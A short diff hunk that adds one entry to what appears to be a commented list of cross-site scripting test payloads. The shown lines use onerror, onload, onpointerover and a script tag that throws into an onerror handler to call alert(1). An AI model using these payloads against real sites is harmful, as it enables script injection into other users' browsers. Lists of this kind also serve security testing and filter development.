@@ -6,6 +6,7 @@
 # <audio src/onerror=alert(1)>
 # <body onload=alert(1)>
 # <xss onpointerover=alert(1) style=display:block>XSS</xss>
+# <script>{onerror=alert}throw 1</script>
 
 
 
